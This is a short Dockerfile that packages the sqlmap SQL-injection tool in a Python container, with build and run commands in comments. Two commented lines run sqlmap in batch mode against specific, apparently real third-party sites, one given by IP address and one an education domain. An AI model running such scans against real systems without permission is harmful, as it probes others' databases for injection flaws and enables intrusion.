FROM land007/python:latest

MAINTAINER Yiqiu Jia <yiqiujia@hotmail.com>

RUN git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

RUN echo $(date "+%Y-%m-%d_%H:%M:%S") >> /.image_times
RUN echo $(date "+%Y-%m-%d_%H:%M:%S") > /.image_time
RUN echo "land007/python-sqlmap" >> /.image_names
RUN echo "land007/python-sqlmap" > /.image_name

#docker build -t land007/python-sqlmap:latest .
#docker rm -f python-sqlmap ; docker run -it --privileged --name python-sqlmap land007/python-sqlmap:latest
#> docker buildx build --platform linux/amd64,linux/arm64,linux/arm/v7 -t land007/python-sqlmap --push .
#python sqlmap.py -u "http://202.102.85.228/ssjgy.jsp?wbtreeid=1001" --batch --banner
#python sqlmap.py -u "http://szclsx.gusuedu.cn/ssjgy.jsp?wbtreeid=1001" --batch --banner
